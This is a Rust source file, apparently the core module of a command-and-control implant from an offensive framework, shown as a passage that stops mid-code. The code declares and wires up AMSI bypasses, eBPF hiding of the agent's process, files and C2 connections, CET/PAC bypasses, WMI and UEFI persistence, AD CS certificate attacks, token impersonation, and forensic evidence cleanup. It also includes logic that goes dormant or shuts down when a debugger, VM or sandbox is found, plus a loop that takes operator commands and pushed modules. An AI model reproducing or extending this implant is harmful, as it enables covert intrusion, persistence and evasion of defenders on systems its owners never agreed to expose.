// Graph API types: CloudEnvironment, TokenResponse, GraphUser, etc.).
#[cfg(feature = "entra-app-abuse")]
pub mod entra_app_abuse;

// Active Directory Certificate Services (AD CS) attack capabilities:
// ESC1-ESC8 enumeration and exploitation patterns.  Includes LDAP-based
// discovery of CAs and templates, static vulnerability detection, certificate
// requests via certreq.exe (temp CSR files cleaned up immediately), and
// PKINIT Kerberos authentication with the obtained certificate.  Certificate-
// based attacks survive password resets.  Requires the agent to run in a
// domain-joined Windows environment with LDAP access to a domain controller.
// All issued certificates are held in memory only.  Windows-only, gated by
// `adcs-attacks` feature flag.
#[cfg(all(windows, feature = "adcs-attacks"))]
pub mod adcs_attacks;

// WMI permanent event subscriptions with encrypted cloud payloads.
// Installs the WMI persistence triad (EventFilter, EventConsumer,
// FilterToConsumerBinding) via COM-based WMI operations.  The consumer
// contains only a stager command — no shellcode.  Payloads are encrypted
// with XChaCha20-Poly1305 and uploaded to cloud storage (Azure Blob,
// AWS S3, or GitHub Gist).  The payload only materializes in memory when
// the trigger fires.  Key derivation from URL + salt ensures the key is
// never stored in plaintext in the WMI subscription.  All COM/WMI calls
// via hash-based resolution — no IAT entries.  Windows-only, gated by
// `wmi-persistence` feature flag.
#[cfg(all(windows, feature = "wmi-persistence"))]
pub mod wmi_persistence;

// UEFI firmware-level persistence: NVRAM manipulation, ESP driver deployment,
// EFI PE/COFF stub building, runtime DXE driver support, capsule delivery,
// and detection/cleanup of firmware implants.  Cross-platform: Linux uses
// /sys/firmware/efi/efivars, Windows uses GetFirmwareEnvironmentVariableW.
// Gated by `uefi-persistence` feature flag.  Handlers in handlers.rs call
// the uefi_persistence crate directly (no agent-side module wrapper needed).

// eBPF-based Linux evasion: hides the agent process, files, and network
// connections from user-space monitoring tools using the kernel's eBPF
// subsystem.  Loads three BPF programs (hide_process, hide_files,
// hide_network) as tracepoints on getdents64 and read syscalls.  Requires
// root or CAP_BPF + CAP_SYS_ADMIN, Linux kernel >= 4.15 (>= 5.2
// recommended), and clang on the build host.  Gracefully degrades when
// unprivileged — the agent continues to run without eBPF evasion.
// Linux-only, gated by `ebpf` feature flag (implies `direct-syscalls`).
#[cfg(all(target_os = "linux", feature = "ebpf"))]
pub mod ebpf_evasion;

// RAII wrapper around NT kernel handles.  Automatically calls NtClose
// via indirect syscall on drop, preventing handle leaks across early
// returns and error paths.  Windows-only (uses syscall_NtClose).
#[cfg(windows)]
pub mod nt_handle;

// Macro for cached dynamic API resolution via PEB walking + API hashing.
// The resolve_api! macro creates a OnceLock-backed static, resolving the
// target function on first use and returning the cached pointer thereafter.
// Foundation utility — no existing code is refactored to use it yet.
#[macro_use]
pub mod pe_resolve_macros;

use anyhow::Result;
use common::{CryptoSession, LockedSecret, Message, Transport};
use std::sync::Arc;
use tokio::sync::{Mutex, RwLock};
use tracing::{error, info, warn};

/// Outbound messages are sent through an mpsc channel to a dedicated writer
/// task that holds the transport lock.  This prevents the deadlock that occurs
/// when the main loop holds the transport Mutex during `recv()` while a
/// spawned command handler tries to acquire the same lock to send a response.
const OUTBOUND_CHANNEL_CAPACITY: usize = 256;

/// Generate a short alphanumeric identifier (8 chars) suitable for
/// transient resource naming (e.g. temporary service names, file names).
pub fn common_short_id() -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    let ts = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    format!("{:08x}", (ts as u32) ^ ((ts >> 32) as u32))
}

pub struct Agent {
    transport: Arc<Mutex<Box<dyn Transport + Send>>>,
    config: config::ConfigHandle,
    /// AES-256-GCM session used to decrypt capability modules deployed at
    /// runtime. Derived from the `module_aes_key` in `agent.toml`, or
    /// a zero key when not configured (development only).
    crypto: Arc<CryptoSession>,
    /// P2P mesh state. Populated when the agent accepts child connections
    /// (via SMB named-pipe listener or TCP P2P relay). An empty/default
    /// mesh means the agent has no children.
    p2p_mesh: Arc<tokio::sync::Mutex<p2p::P2pMesh>>,
    /// Ed25519 private key for P2P mesh authentication (mlocked, zeroized on drop).
    mesh_private_key: Arc<LockedSecret>,
    /// Ed25519 public key corresponding to `mesh_private_key`.
    mesh_public_key: [u8; 32],
}

impl Agent {
    pub fn new(
        transport: Box<dyn Transport + Send>,
        agent_id: String,
        mesh_private_key: Arc<LockedSecret>,
        mesh_public_key: [u8; 32],
    ) -> Result<Self> {
        // Evasion patches are applied once in Agent::run() before the main loop.
        // Applying them here as well would create a race: if the memory patch
        // takes effect here but is reverted by EDR before run() installs the
        // hardware-breakpoint layer, neither layer would be active.  A single
        // ordered application in run() is safer.

        let cfg = config::load_config()?;

        // Enforce kill date from malleable profile at agent startup (4-2).
        // Uses config::check_kill_date which is transport-independent so that
        // kill-date enforcement works regardless of which transport features
        // are compiled in.
        if !cfg.malleable_profile.kill_date.is_empty() {
            crate::config::check_kill_date(&cfg.malleable_profile.kill_date)?;
        }

        // Derive the module-decryption key from configuration.
        // In production this key must be set in agent.toml or baked in at build time.
        let crypto_key: [u8; 32] = if let Some(ref b64) = cfg.module_aes_key {
            use base64::Engine;
            let bytes = base64::engine::general_purpose::STANDARD
                .decode(b64)
                .map_err(|e| {
                    anyhow::anyhow!(
                        "module_aes_key in agent.toml is not valid base64: {}. \
                     Provide a valid 32-byte base64-encoded key or remove the field \
                     to disable module signature verification.",
                        e
                    )
                })?;
            if bytes.len() != 32 {
                return Err(anyhow::anyhow!(
                    "module_aes_key must decode to exactly 32 bytes, got {} byte(s). \
                     Re-generate the key with the `keygen` tool.",
                    bytes.len()
                ));
            }
            let mut key = [0u8; 32];
            key.copy_from_slice(&bytes);
            key
        } else if let Some(baked) = option_env!("SYS_MODULE_KEY") {
            // Fallback to compile-time baked key (injected by server-side builds).
            use base64::Engine;
            let bytes = base64::engine::general_purpose::STANDARD
                .decode(baked)
                .map_err(|e| {
                    anyhow::anyhow!("SYS_MODULE_KEY baked value is not valid base64: {}", e)
                })?;
            if bytes.len() != 32 {
                return Err(anyhow::anyhow!("SYS_MODULE_KEY must decode to 32 bytes"));
            }
            let mut key = [0u8; 32];
            key.copy_from_slice(&bytes);
            key
        } else {
            // In release builds (no debug_assertions, not dev/test feature) a
            // missing module_aes_key is a hard error: an all-zero key lets
            // anyone push arbitrary modules.  Development builds accept the
            // insecure default so the build cycle stays fast.
            #[cfg(not(any(debug_assertions, feature = "dev", test)))]
            return Err(anyhow::anyhow!(
                "module_aes_key is required in production builds. \
                 Generate a 32-byte key with `keygen`, base64-encode it, \
                 and set it in agent.toml under [module_aes_key]."
            ));

            #[cfg(any(debug_assertions, feature = "dev", test))]
            tracing::warn!(
                "WARNING: module_aes_key not set — using insecure all-zero key. \
                 Do not use in production!"
            );

            [0u8; 32] // insecure default; acceptable only for development builds
        };

        let crypto = Arc::new(CryptoSession::from_key(crypto_key));
        crate::memory_guard::register_session_key(&crypto);
        let mut p2p_mesh = p2p::P2pMesh::new(agent_id, p2p::P2pMesh::DEFAULT_MAX_CHILDREN);
        p2p_mesh.set_mesh_identity(mesh_private_key.clone(), mesh_public_key);

        Ok(Self {
            transport: Arc::new(Mutex::new(transport)),
            config: Arc::new(RwLock::new(cfg)),
            crypto,
            p2p_mesh: Arc::new(tokio::sync::Mutex::new(p2p_mesh)),
            mesh_private_key,
            mesh_public_key,
        })
    }

    /// Return the agent's Ed25519 mesh public key.
    pub fn mesh_public_key(&self) -> [u8; 32] {
        self.mesh_public_key
    }

    pub async fn run(&mut self) -> Result<()> {
        // Trusted Execution Environment Enforcement runs FIRST, before any
        // side-effectful hooks are applied.  If the environment is hostile
        // (debugger, wrong domain, VM when refuse_in_vm is set) the agent
        // enters a dormant state without having modified any process state.
        #[cfg(feature = "env-validation")]
        {
            let decision = {
                let cfg = self.config.read().await;
                env_check::enforce(
                    cfg.required_domain.as_deref(),
                    cfg.refuse_when_debugged,
                    cfg.refuse_in_vm,
                    cfg.sandbox_score_threshold,
                )
            };

            if decision.report.ld_preload_set {
                tracing::warn!("LD_PRELOAD is set in the environment (soft warning)");
            }
            if decision.report.timing_anomaly_detected {
                tracing::warn!("Timing anomaly detected (soft warning, possibly high load)");
            }

            if decision.refuse {
                error!(
                    "environment validation failed (debugger={}, vm={}, domain_match={:?}); agent entering dormant state",
                    decision.report.debugger_present,
                    decision.report.vm_detected,
                    decision.report.domain_match,
                );
                const RECHECK_INTERVAL_SECS: u64 = 2 * 3600;
                const MAX_RETRIES: u32 = 3;
                let mut retries = 0u32;
                loop {
                    if let Err(e) = crate::memory_guard::guarded_sleep(
                        std::time::Duration::from_secs(RECHECK_INTERVAL_SECS),
                        None,
                        0, // no key rotation during dormant sleep
                    )
                    .await
                    {
                        error!("[memory-guard] error during dormant sleep: {e}");
                    }
                    let recheck = {
                        let cfg = self.config.read().await;
                        env_check::enforce(
                            cfg.required_domain.as_deref(),
                            cfg.refuse_when_debugged,
                            cfg.refuse_in_vm,
                            cfg.sandbox_score_threshold,
                        )
                    };
                    if !recheck.refuse {
                        info!("environment re-check passed; resuming normal operation");
                        break;
                    }
                    retries += 1;
                    if retries >= MAX_RETRIES {
                        error!("maximum dormant retries ({}) reached; returning error so reconnect loop retries", MAX_RETRIES);
                        return Err(anyhow::anyhow!(
                            "Environment check failed permanently after {} retries",
                            MAX_RETRIES
                        ));
                    }
                    error!(
                        "environment re-check failed ({}/{}); remaining dormant",
                        retries, MAX_RETRIES
                    );
                }
            } else {
                info!(
                    "environment validation passed (debugger={}, vm={}, domain_match={:?})",
                    decision.report.debugger_present,
                    decision.report.vm_detected,
                    decision.report.domain_match,
                );
            }
        }

        // Evasion layers are applied AFTER environment validation succeeds.
        // Applying them before validation would produce side-effects (AMSI
        // patches, thread hiding) even on hostile hosts where the agent should
        // refuse to run.

        // Evanesco VEH registration must happen BEFORE any AMSI/ETW bypass
        // activation so that the Evanesco VEH handler is lower in the chain
        // (higher priority) and does not interfere with the AMSI HWBP VEH.
        #[cfg(all(windows, feature = "evanesco"))]
        {
            let cfg = self.config.read().await;
            let evanesco_cfg = &cfg.evanesco;
            if let Err(e) = crate::page_tracker::init(
                evanesco_cfg.idle_threshold_ms,
                evanesco_cfg.scan_interval_ms,
            ) {
                tracing::warn!("evanesco: init failed (non-fatal): {e:#}");
            }
        }

        // Initialise user-mode NT kernel interface emulation.  This MUST
        // happen before any injection or memory operations that would
        // otherwise go through ntdll syscall stubs.  The emulation layer
        // routes configured Nt* calls through kernel32/advapi32 equivalents,
        // making the agent invisible to EDR hooks on ntdll.
        #[cfg(all(windows, feature = "syscall-emulation"))]
        {
            let cfg = self.config.read().await;
            crate::syscall_emulation::init_from_config(&cfg.syscall_emulation);
            tracing::info!(
                "syscall_emulation: initialised (enabled={}, prefer_kernel32={}, emulated={:?})",
                cfg.syscall_emulation.enabled,
                cfg.syscall_emulation.prefer_kernel32,
                cfg.syscall_emulation.emulated_functions,
            );
        }

        // Initialise CET / shadow-stack bypass.  This MUST happen before any
        // injection or stack-spoofing operations that manipulate return
        // addresses.  Detects the current CET state and configures the
        // appropriate bypass strategy (policy disable, call chain, or VEH).
        #[cfg(all(windows, feature = "cet-bypass", target_arch = "x86_64"))]
        {
            let cfg = self.config.read().await;
            crate::cet_bypass::init_from_config(&cfg.cet_bypass);
            tracing::info!(
                "cet_bypass: initialised (enabled={}, state={})",
                cfg.cet_bypass.enabled,
                crate::cet_bypass::cet_state(),
            );
        }

        // Initialise BTI/PAC bypass for ARM64.  ARM64 Windows uses
        // cryptographic pointer authentication (QARMA5 with 128-bit keys)
        // to sign return addresses — significantly harder to bypass than
        // Intel CET.  This MUST happen before any injection or
        // stack-spoofing operations.  Strategies: trampoline routing,
        // BYOVD key extraction.
        #[cfg(all(windows, feature = "pac-bypass", target_arch = "aarch64"))]
        {
            let cfg = self.config.read().await;
            crate::bti_pac_bypass::init_from_config(&cfg.bti_pac);
            tracing::info!(
                "bti_pac_bypass: initialised (enabled={}, state={})",
                cfg.bti_pac.enabled,
                crate::bti_pac_bypass::pac_state_str(),
            );
        }

        // Token-only impersonation: avoids ImpersonateNamedPipeClient
        // on the main agent thread, which is heavily signatured by EDR.
        // Uses NtImpersonateThread or SetThreadToken to apply extracted
        // tokens instead.  Includes encrypted token cache and auto-revert.
        #[cfg(all(windows, feature = "token-impersonation"))]
        {
            let cfg = self.config.read().await;
            crate::token_impersonation::init_from_config(&cfg.token_impersonation);
        }

        // Initialise the forensic cleanup subsystem.  Loads config for
        // Prefetch evidence removal (cleanup method, auto-clean after
        // injection, USN journal cleanup, etc.).  All NT API calls use
        // indirect syscalls to bypass EDR hooks.
        #[cfg(all(windows, feature = "forensic-cleanup"))]
        {
            let cfg = self.config.read().await;
            crate::forensic_cleanup::prefetch::init_from_config(&cfg.prefetch);
            crate::forensic_cleanup::timestamps::init_from_config(&cfg.timestamps);
        }

        // eBPF-based Linux evasion: hides agent process, files, and network
        // connections from user-space tools (ps, ls, netstat, ss) by loading
        // eBPF programs into the kernel that hook getdents64 and read syscalls.
        // Gracefully degrades if unprivileged or if the kernel doesn't support
        // the required eBPF features.  Linux-only, gated by `ebpf` feature.
        #[cfg(all(target_os = "linux", feature = "ebpf"))]
        {
            let pid = std::process::id();

            // Derive file patterns: hide the agent binary filename and the
            // sysd config directory name so ps/ls cannot discover the agent.
            let mut pattern_strings: Vec<String> = Vec::new();
            if let Some(filename) = std::env::current_exe()
                .ok()
                .as_ref()
                .and_then(|p| p.file_name())
                .and_then(|n| n.to_str())
                .map(str::to_string)
            {
                pattern_strings.push(filename);
            }
            // Hide the sysd config directory entry from getdents64 results.
            pattern_strings.push("sysd".to_string());

            // Collect transport ports from the active configuration so that
            // outbound connections are not visible in netstat/ss output.
            let ports: Vec<u16> = {
                let cfg = self.config.read().await;
                let mp = &cfg.malleable_profile;
                let mut v: Vec<u16> = Vec::new();

                // SSH transport port.
                if mp.ssh_host.is_some() {
                    v.push(mp.ssh_port.unwrap_or(22));
                }

                // SMB named-pipe TCP relay port.
                if mp.smb_pipe_enabled {
                    if let Some(p) = mp.smb_tcp_relay_port {
                        v.push(p);
                    }
                }

                // QUIC transport port.
                if mp.c2_quic.enabled {
                    v.push(mp.c2_quic.port);
                }

                // HTTP / TLS / DoH: extract the port from the configured C2
                // endpoint URL so those connections are hidden from netstat.
                let endpoint_url: &str = if let Some(ref doh) = mp.doh_server_url {
                    doh.as_str()
                } else if !mp.direct_c2_endpoint.is_empty() {
                    mp.direct_c2_endpoint.as_str()
                } else {
                    ""
                };
                if !endpoint_url.is_empty() {
                    let without_scheme = endpoint_url
                        .trim_start_matches("https://")
                        .trim_start_matches("http://");
                    let host_port = without_scheme.split('/').next().unwrap_or("");
                    let default_port: u16 = if endpoint_url.starts_with("http://") {
                        80
                    } else {
                        443
                    };
                    let port = host_port
                        .rsplit_once(':')
                        .and_then(|(_, p)| p.parse::<u16>().ok())
                        .unwrap_or(default_port);
                    v.push(port);
                }

                v.sort_unstable();
                v.dedup();
                v
            };

            let patterns: Vec<&str> = pattern_strings.iter().map(String::as_str).collect();
            let _ebpf_mgr = crate::ebpf_evasion::init(pid, &patterns, &ports);
            // ebpf_mgr is dropped when the scope ends, which would detach
            // programs.  For persistent evasion, the manager must be stored
            // in the Agent struct or leaked.  For now we leak it so evasion
            // persists for the lifetime of the process.
            std::mem::forget(_ebpf_mgr);
        }

        #[cfg(feature = "stealth")]
        {
            tracing::debug!("Applying evasion layers");
            // AMSI bypass: choose one strategy, never combine (H-11).
            // The memory patch overwrites the bytes that HWBP set breakpoints on,
            // so running both makes the HWBP path silently no-op.
            //
            // Strategy is selected at compile time via feature flags:
            //   - hw-bp-hook feature: general-purpose hw_bp_hook framework
            //     (invisible hooks via Dr0–Dr3 with per-slot callbacks).
            //   - hwbp-amsi feature:  simpler evasion.rs HWBP approach (Dr0/Dr1).
            //   - Default (neither):  memory-patch approach (no env-var trace).
            // The old ORCHESTRA_AMSI_HWBP env-var check was a host-based IOC
            // and has been removed.
            //
            // Priority: hwbp-amsi > hw-bp-hook > default memory patch.
            #[cfg(feature = "hwbp-amsi")]
            {
                unsafe {
                    crate::evasion::patch_amsi();
                }
            }
            #[cfg(all(not(feature = "hwbp-amsi"), feature = "hw-bp-hook"))]
            {
                let hwbp_ok = unsafe { crate::hw_bp_hook::install_amsi_bypass() };
                if !hwbp_ok {
                    tracing::warn!("hw-bp-hook AMSI bypass failed; falling back to memory patch");
                    crate::amsi_defense::orchestrate_layers();
                }
            }
            #[cfg(all(not(feature = "hwbp-amsi"), not(feature = "hw-bp-hook")))]
            {
                crate::amsi_defense::orchestrate_layers();
            }
            crate::amsi_defense::verify_bypass();
            crate::evasion::hide_current_thread();
            tracing::debug!("Evasion layers applied");
        }

        // Startup transport selection is feature-gated and profile-driven.
        // Effective priority matches outbound startup selection:
        // SSH > DoH > HTTP > TLS fallback.
        //
        // `outbound::build_outbound_transport` performs the concrete transport
        // construction; this block documents and validates the same runtime
        // decisions from the active malleable profile.
        {
            let cfg = self.config.read().await;
            let profile = &cfg.malleable_profile;

            #[cfg(feature = "ssh-transport")]
            let ssh_selected = profile
                .ssh_host
                .as_deref()
                .filter(|s| !s.is_empty())
                .is_some();
            #[cfg(not(feature = "ssh-transport"))]
            let ssh_selected = false;

            #[cfg(feature = "doh-transport")]
            let doh_selected = !ssh_selected && profile.dns_over_https;
            #[cfg(not(feature = "doh-transport"))]
            let doh_selected = false;

            #[cfg(feature = "http-transport")]
            let http_selected = !ssh_selected && !doh_selected && profile.cdn_relay;
            #[cfg(not(feature = "http-transport"))]
            let http_selected = false;

            if ssh_selected {
                info!("startup transport profile preference: SSH (priority=1)");
            } else if doh_selected {
                info!("startup transport profile preference: DoH (priority=2)");
            } else if http_selected {
                info!("startup transport profile preference: HTTP (priority=3)");
            } else {
                info!("startup transport profile preference: TLS (priority=4 fallback)");
            }

            #[cfg(not(feature = "ssh-transport"))]
            if profile
                .ssh_host
                .as_deref()
                .filter(|s| !s.is_empty())
                .is_some()
            {
                tracing::warn!(
                    "ssh_host is configured in the malleable profile but the `ssh-transport` \
                     feature is not compiled in. SSH branch is skipped."
                );
            }

            #[cfg(not(feature = "doh-transport"))]
            if profile.dns_over_https {
                tracing::warn!(
                    "dns_over_https=true in config but the `doh-transport` feature is not \
                     compiled in. DoH branch is skipped in startup transport selection. \
                     Rebuild with --features doh-transport to enable DohTransport. \
                     NOTE: a server-side DoH listener is required and is not included \
                     in this release."
                );
            }
            #[cfg(not(feature = "http-transport"))]
            if profile.cdn_relay {
                tracing::warn!(
                    "cdn_relay=true in config but the `http-transport` feature is not \
                     compiled in. HTTP branch is skipped in startup transport selection. \
                     Rebuild with --features http-transport to enable HttpTransport."
                );
            }
        }

        #[cfg(feature = "hot-reload")]
        {
            let handle = self.config.clone();
            if let Ok(Some(_watcher)) = config::spawn_config_watcher(handle) {
                info!("Hot-reload config watcher started");
            }
        }

        // Optimise hot functions at startup
        #[cfg(feature = "unsafe-runtime-rewrite")]
        if let Err(e) = optimizer::optimize_hot_function("crypto_session_encrypt") {
            tracing::warn!("Runtime optimization failed: {}", e);
        }

        // When perf-optimize is enabled, additionally optimise the crypto
        // decrypt path and report the detected SIMD microarchitecture level.
        #[cfg(all(feature = "perf-optimize", feature = "unsafe-runtime-rewrite"))]
        {
            if let Err(e) = optimizer::optimize_hot_function("crypto_session_decrypt") {
                tracing::warn!("Runtime optimization (decrypt) failed: {}", e);
            }
            tracing::info!(
                arch_level = crate::perf::detected_arch_level(),
                "perf-optimize: SIMD microarchitecture detected"
            );
        }
        #[cfg(all(feature = "perf-optimize", not(feature = "unsafe-runtime-rewrite")))]
        {
            tracing::info!(
                arch_level = crate::perf::detected_arch_level(),
                "perf-optimize: SIMD microarchitecture detected (runtime rewrite disabled, build-time diversification active)"
            );
        }

        // Honour opt-in persistence (Prompt H).
        #[cfg(feature = "persistence")]
        {
            let cfg = self.config.read().await;
            if cfg.persistence_enabled {
                match persistence::install_persistence() {
                    Ok(p) => info!("Persistence installed at {}", p.display()),
                    Err(e) => error!("Failed to install persistence: {e}"),
                }
            }
        }

        info!("Agent started, waiting for commands...");
        let mut tasks = tokio::task::JoinSet::new();

        // Spawn the periodic self-re-encoding background task.  Derive a
        // non-zero default seed from the session key so the feature is active
        // from the first cycle.  The seed will be updated when the server
        // sends `SetReencodeSeed`.
        #[cfg(feature = "self-reencode")]
        {
            let interval = {
                let cfg = self.config.read().await;
                cfg.reencode_interval_secs
            };
            let default_seed = crate::self_reencode::derive_default_seed(&self.crypto.key_bytes());
            let shutdown = crate::handlers::SHUTDOWN_NOTIFY.clone();
            tasks.spawn(async move {
                let _ = crate::self_reencode::spawn_periodic_reencode(
                    default_seed,
                    std::time::Duration::from_secs(interval),
                    shutdown,
                )
                .await;
            });
            info!(
                "self-reencode background task spawned (interval={interval}s, seed=auto-derived)"
            );
        }

        // Outbound message channel: spawned command handlers push responses
        // here instead of locking the transport directly.  The main loop
        // drains the channel alongside recv(), preventing the deadlock that
        // occurs when the recv()-side holds the Mutex while a spawned task
        // waits for the same lock to send a response.
        let (outbound_tx, mut outbound_rx) =
            tokio::sync::mpsc::channel::<Message>(OUTBOUND_CHANNEL_CAPACITY);

        // Spawn the P2P heartbeat and dead-link detection background task.
        // This is a no-op when the mesh has no links; it sends heartbeats
        // to connected links and detects dead ones.
        #[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
        {
            let mesh = self.p2p_mesh.clone();
            let out_tx = outbound_tx.clone();
            let _hb_handle =
                p2p::spawn_heartbeat_task(mesh, out_tx, std::time::Duration::from_secs(30));
            info!("P2P heartbeat background task spawned (interval=30s)");
        }

        // Internal channel for P2P parent-link C2 messages.  The parent
        // reader task (spawned when a parent link is established) sends
        // decrypted Messages through this channel.  The main loop reads
        // them alongside the C2 transport.
        //
        // Always created so the select! branch compiles unconditionally;
        // when no P2P transport feature is enabled the sender is never
        // stored in the mesh and the channel stays empty.
        let (p2p_inbound_tx, mut p2p_inbound_rx) =
            tokio::sync::mpsc::channel::<Message>(OUTBOUND_CHANNEL_CAPACITY);

        // Wire the inbound sender into the mesh so `connect_to_parent`
        // can pass it to `spawn_parent_reader`.
        #[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
        {
            let mut mesh = self.p2p_mesh.lock().await;
            mesh.inbound_tx = Some(p2p_inbound_tx);
        }

        // Iteration counter for periodic tasks (syscall cache validation, etc.).
        let mut loop_iteration: u32 = 0;

        // Periodic environment re-check state.  Sandboxes can delay attaching
        // analysis tools until after the startup validation passes.  Re-running
        // the check every few hours catches tools that were absent at startup
        // but appeared later (e.g., a debugger attached after the initial
        // checkin, or a sandbox that delayed injecting its monitoring DLL).
        let env_recheck_interval = std::time::Duration::from_secs(3 * 3600); // 3 hours
        let mut last_env_recheck = std::time::Instant::now();
        // Track the initial VM state so the re-check only triggers when the
        // environment *changes* from non-hostile to hostile.  This avoids
        // false positives from the re-check on VMs that were already accepted
        // at startup with full knowledge.
        #[cfg(feature = "env-validation")]
        let initial_vm_ok = {
            let cfg = self.config.read().await;
            !(cfg.refuse_in_vm || cfg.refuse_when_debugged || cfg.sandbox_score_threshold.is_some())
        };

        loop {
            loop_iteration += 1;

            // Periodic syscall SSN cache validation.  Cross-references the
            // ntdll PE timestamp and probes critical syscalls to detect
            // stale entries (e.g. after a silent Windows Update).
            #[cfg(all(windows, feature = "direct-syscalls"))]
            {
                let interval = self.config.read().await.syscall.validate_interval;
                if interval > 0 && loop_iteration % interval == 0 {
                    match crate::syscalls::validate_cache() {
                        Ok(n) => {
                            tracing::debug!("Periodic syscall cache validation: {} entries OK", n);
                        }
                        Err(e) => {
                            tracing::warn!("Periodic syscall cache validation failed: {e}; cache invalidated, will re-map on next syscall");
                        }
                    }
                }
            }

            // Periodic environment re-check.  Only runs when env-validation is
            // enabled and the initial startup check passed (otherwise the agent
            // is already in the dormant retry loop).  When the environment
            // transitions from benign to hostile mid-execution, the agent
            // gracefully shuts down instead of continuing to operate under
            // observation.
            #[cfg(feature = "env-validation")]
            {
                let elapsed = last_env_recheck.elapsed();
                if elapsed >= env_recheck_interval && !initial_vm_ok {
                    last_env_recheck = std::time::Instant::now();
                    let cfg = self.config.read().await;
                    let recheck = env_check::enforce(
                        cfg.required_domain.as_deref(),
                        cfg.refuse_when_debugged,
                        cfg.refuse_in_vm,
                        cfg.sandbox_score_threshold,
                    );
                    if recheck.refuse {
                        tracing::warn!(
                            "env_check: periodic re-check FAILED after {} h — \
                             environment became hostile (debugger={}, vm={}, domain={:?}); \
                             initiating graceful shutdown to prevent analysis",
                            elapsed.as_secs() / 3600,
                            recheck.report.debugger_present,
                            recheck.report.vm_detected,
                            recheck.report.domain_match,
                        );
                        // Send audit log about the re-check failure before exiting.
                        let audit_ts = std::time::SystemTime::now()
                            .duration_since(std::time::UNIX_EPOCH)
                            .unwrap_or(std::time::Duration::from_secs(0))
                            .as_secs();
                        let _ = outbound_tx.send(Message::AuditLog(
                            common::AuditEvent {
                                timestamp: audit_ts,
                                agent_id: String::new(), // filled by transport layer
                                user: "system".to_string(),
                                action: "env_recheck_failed".to_string(),
                                details: format!(
                                    "Periodic env re-check failed after {}h: debugger={}, vm={}, sandbox_score={}",
                                    elapsed.as_secs() / 3600,
                                    recheck.report.debugger_present,
                                    recheck.report.vm_detected,
                                    recheck.report.sandbox_score,
                                ),
                                outcome: common::Outcome::Failure,
                                tampered: false,
                            },
                        )).await;
                        break;
                    } else {
                        tracing::debug!(
                            "env_check: periodic re-check passed ({} h elapsed)",
                            elapsed.as_secs() / 3600,
                        );
                    }
                }
            }

            // Drain any pending outbound messages before we block on recv().
            // This ensures responses from the previous iteration are flushed
            // before we re-acquire the lock to wait for the next command.
            {
                let mut transport = self.transport.lock().await;
                while let Ok(msg) = outbound_rx.try_recv() {
                    if let Err(e) = transport.send(msg).await {
                        error!("Failed to send outbound message: {}", e);
                    }
                }
            }

            let msg_fut = async {
                let mut transport = self.transport.lock().await;
                transport.recv().await
            };

            let msg = tokio::select! {
                res = msg_fut => res,
                // Also check for outbound messages while waiting for inbound.
                // This handles the race where a response is produced just
                // before we re-acquire the lock for recv().
                outbound = outbound_rx.recv() => {
                    if let Some(msg) = outbound {
                        let mut transport = self.transport.lock().await;
                        if let Err(e) = transport.send(msg).await {
                            error!("Failed to send outbound message: {}", e);
                        }
                    }
                    continue;
                }
                // P2P parent-link messages: decrypted C2 data from the
                // parent agent, injected via `spawn_parent_reader`.
                p2p_msg = p2p_inbound_rx.recv() => {
                    match p2p_msg {
                        Some(msg) => Ok(msg),
                        None => {
                            warn!("P2P inbound channel closed");
                            continue;
                        }
                    }
                }
                _ = crate::handlers::SHUTDOWN_NOTIFY.notified() => {
                    info!("Shutdown signal received, draining tasks and shutting down.");
                    #[cfg(all(windows, feature = "evanesco"))]
                    crate::page_tracker::shutdown();
                    #[cfg(all(windows, feature = "stealth"))]
                    crate::amsi_defense::cleanup_com_hijack();
                    break;
                }
            };

            match msg {
                Ok(Message::TaskRequest {
                    task_id,
                    command,
                    operator_id,
                }) => {
                    info!("Received command: {:?}", command);
                    let crypto = self.crypto.clone();
                    let config_handle = self.config.clone();
                    let command_for_sync = command.clone();
                    let out_tx = outbound_tx.clone();
                    let p2p_mesh = self.p2p_mesh.clone();
                    tasks.spawn(async move {
                        let config = Arc::new(Mutex::new(config_handle.read().await.clone()));
                        let (response, result_data, audit_event) = handlers::handle_command(
                            crypto,
                            config.clone(),
                            command,
                            operator_id.as_deref().unwrap_or("admin"),
                            out_tx.clone(),
                            p2p_mesh,
                        )
                        .await;

                        if matches!(command_for_sync, common::Command::ReloadConfig)
                            && response.is_ok()
                        {
                            let updated_cfg = config.lock().await.clone();
                            let mut live_cfg = config_handle.write().await;
                            *live_cfg = updated_cfg;
                        }

                        if let Err(e) = out_tx.send(Message::AuditLog(audit_event)).await {
                            warn!("Outbound channel closed, dropping audit log: {}", e);
                        }
                        if let Err(e) = out_tx
                            .send(Message::TaskResponse {
                                task_id,
                                result: response,
                                result_data,
                            })
                            .await
                        {
                            warn!("Outbound channel closed, dropping response: {}", e);
                        }
                    });
                }
                Ok(Message::Shutdown) => {
                    info!("Shutdown received, exiting.");
                    #[cfg(all(windows, feature = "evanesco"))]
                    crate::page_tracker::shutdown();
                    #[cfg(all(windows, feature = "stealth"))]
                    crate::amsi_defense::cleanup_com_hijack();
                    break;
                }
                Ok(Message::ModulePush {
                    module_name,
                    version,
                    encrypted_blob,
                }) => {
                    info!(
                        "ModulePush received: module='{}' version='{}'",
                        module_name, version
                    );
                    let crypto = self.crypto.clone();
                    let out_tx = outbound_tx.clone();
                    let name_clone = module_name.clone();
                    let ver_clone = version.clone();
                    let verify_key = self.config.read().await.module_verify_key.clone();
                    tasks.spawn(async move {
                        let result = handlers::push_module(
                            name_clone.clone(),
                            &encrypted_blob,
                            &crypto,
                            verify_key.as_deref(),
                        );
                        let (outcome, details) = match &result {
                            Ok(s) => {
                                info!("ModulePush '{}': {}", name_clone, s);
                                (common::Outcome::Success, s.as_str().to_owned())
                            }
                            Err(e) => {
                                error!("ModulePush '{}' failed: {}", name_clone, e);
                                (common::Outcome::Failure, e.as_str().to_owned())
                            }
                        };
                        let action =
                            format!("ModulePush(module={name_clone:?},version={ver_clone:?})");
                        let audit = handlers::make_audit(&action, outcome, &details, "server");
                        if let Err(e) = out_tx.send(Message::AuditLog(audit)).await {
                            warn!("Outbound channel closed, dropping ModulePush audit: {}", e);
                        }
                    });
                }
                Ok(Message::ModuleResponse {
                    module_id,
                    encrypted_blob,
                }) => {
                    // Complete the pending oneshot so the DownloadModule
                    // handler can proceed with loading the module.
                    if let Some(sender) = handlers::PENDING_MODULE_REQUESTS
                        .lock()
                        .unwrap()
                        .remove(&module_id)
                    {
